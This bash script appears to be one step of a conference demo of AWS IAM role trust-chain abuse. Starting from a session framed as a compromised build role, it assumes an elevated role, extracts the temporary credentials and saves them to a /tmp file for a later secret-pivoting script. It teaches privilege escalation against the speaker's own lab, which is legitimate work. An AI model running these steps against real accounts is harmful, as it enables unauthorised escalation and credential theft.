#!/usr/bin/env bash
# Speaker Part B, step 2: demonstrate IAM role trust chain abuse.
#
# Starts from speaker's current session (representing a compromised build or
# persistence session) and chains into the elevated role. Prints the new
# identity so the audience sees the privilege jump.
#
# Prereqs:
#   - terraform/speaker-demo applied
#   - ELEVATED_ROLE_ARN from terraform output
#   - Speaker AWS credentials active
#
# Demonstration narrative:
#   "The build role we compromised only had GetSecretValue. But build roles
#    are rarely isolated. They share account with other roles whose trust
#    policies are misconfigured, or they sit in accounts that can assume into
#    production. One sts:AssumeRole call, and we are somewhere else entirely."
set -euo pipefail

: "${ELEVATED_ROLE_ARN:?set ELEVATED_ROLE_ARN from terraform output}"
: "${AWS_REGION:?set AWS_REGION}"

SESSION_NAME="${SESSION_NAME:-rtv-demo-chain-$(date +%s)}"

echo "=== Current identity (pre-chain) ==="
aws sts get-caller-identity --region "$AWS_REGION" | jq
echo ""

echo "=== Assuming elevated role ==="
echo "Target: $ELEVATED_ROLE_ARN"
CREDS=$(aws sts assume-role \
  --role-arn "$ELEVATED_ROLE_ARN" \
  --role-session-name "$SESSION_NAME" \
  --duration-seconds 3600 \
  --region "$AWS_REGION" \
  --output json)

AK=$(echo "$CREDS" | jq -r .Credentials.AccessKeyId)
SK=$(echo "$CREDS" | jq -r .Credentials.SecretAccessKey)
ST=$(echo "$CREDS" | jq -r .Credentials.SessionToken)
EXP=$(echo "$CREDS" | jq -r .Credentials.Expiration)

echo ""
echo "=== Post-chain session ==="
echo "Expires: $EXP"
echo ""
echo "Paste the following into a NEW terminal to continue the demo from the"
echo "chained session (or set them in the current one before 03-pivot-secrets.sh):"
echo ""
echo "  export AWS_ACCESS_KEY_ID=$AK"
echo "  export AWS_SECRET_ACCESS_KEY=$SK"
echo "  export AWS_SESSION_TOKEN=$ST"
echo "  export AWS_REGION=$AWS_REGION"
echo ""

# Persist to a dotfile the pivot script reads, for convenience during the live demo
CHAIN_ENV_FILE="${CHAIN_ENV_FILE:-/tmp/.rtv-demo-chain-creds}"
cat > "$CHAIN_ENV_FILE" <<EOF
export AWS_ACCESS_KEY_ID=$AK
export AWS_SECRET_ACCESS_KEY=$SK
export AWS_SESSION_TOKEN=$ST
export AWS_REGION=$AWS_REGION
EOF
chmod 600 "$CHAIN_ENV_FILE"
echo "Also saved to ${CHAIN_ENV_FILE} (source this before 03-pivot-secrets.sh)"
echo ""

echo "=== Identity after chain ==="
AWS_ACCESS_KEY_ID="$AK" \
AWS_SECRET_ACCESS_KEY="$SK" \
AWS_SESSION_TOKEN="$ST" \
  aws sts get-caller-identity --region "$AWS_REGION" | jq

echo ""
echo "Run 03-pivot-secrets.sh next (source ${CHAIN_ENV_FILE} first if running in same shell)."
